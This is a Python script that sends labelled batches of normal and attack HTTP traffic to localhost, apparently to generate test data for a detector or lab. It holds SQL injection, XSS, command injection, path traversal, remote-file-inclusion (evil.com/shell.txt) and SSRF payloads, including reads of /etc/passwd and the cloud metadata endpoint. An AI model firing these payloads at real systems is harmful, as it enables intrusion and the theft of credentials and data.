# tools/attack_generator.py

import requests
import time
import random
import urllib.parse

BASE_URL = "http://localhost"
DELAY = 0.25

def enc(x):
    return urllib.parse.quote(x, safe="")

def send_get(path, params=None):
    try:
        requests.get(f"{BASE_URL}{path}", params=params, timeout=3)
    except Exception:
        pass
    time.sleep(DELAY)

def send_post(path, data=None):
    try:
        requests.post(f"{BASE_URL}{path}", data=data, timeout=3)
    except Exception:
        pass
    time.sleep(DELAY)

# ---------------- NORMAL ----------------

def normal():
    send_get("/home")
    send_get("/products", {"id": str(random.randint(1, 100))})
    send_post("/contact", {"msg": "hello world"})

# ---------------- SQLi ----------------

SQLI_PAYLOADS = [
    "1 OR 1=1",
    "1' OR '1'='1",
    "1 UNION SELECT username,password FROM users",
    "1 AND SLEEP(5)",
    "1' AND 'a'='a"
]

def sqli():
    p = (random.choice(SQLI_PAYLOADS))
    send_get("/search", {"id": p})
    send_post("/login", {"user": "admin", "pass": p})

# ---------------- XSS ----------------

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]

def xss():
    p = (random.choice(XSS_PAYLOADS))
    send_get("/search", {"q": p})
    send_post("/comment", {"text": p})

# ---------------- CMDi ----------------

CMD_PAYLOADS = [
    "ls;whoami",
    "id && whoami",
    "cat /etc/passwd | id",
    "ping -c 1 127.0.0.1 && id"
]

def cmdi():
    p = (random.choice(CMD_PAYLOADS))
    send_get("/exec", {"cmd": p})
    send_post("/exec", {"cmd": p})

# ---------------- LFI ----------------

LFI_PAYLOADS = [
    "/etc/passwd",
    "../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts"
]

def lfi():
    p = random.choice(LFI_PAYLOADS)
    send_get("/get", {"file": p})

# ---------------- RFI ----------------

RFI_PAYLOADS = [
    "http://example.com/test.txt",
    "https://evil.com/shell.txt"
]

def rfi():
    send_get("/load", {"file": (random.choice(RFI_PAYLOADS))})

# ---------------- SSRF ----------------

SSRF_PAYLOADS = [
    "http://127.0.0.1/admin",
    "http://localhost:8080",
    "http://169.254.169.254/latest/meta-data/"
]

def ssrf():
    send_get("/test", {"url": (random.choice(SSRF_PAYLOADS))})

# ---------------- MAIN ----------------

if __name__ == "__main__":

    print("[*] Normal traffic")
    for _ in range(10):
        normal()

    print("[*] SQL Injection")
    for _ in range(10):
        sqli()

    print("[*] XSS")
    for _ in range(10):
        xss()

    print("[*] Command Injection")
    for _ in range(10):
        cmdi()

    print("[*] LFI / Traversal")
    for _ in range(10):
        lfi()

    print("[*] RFI")
    for _ in range(10):
        rfi()

    print("[*] SSRF")
    for _ in range(10):
        ssrf()

    print("[+] Attack generation finished cleanly")
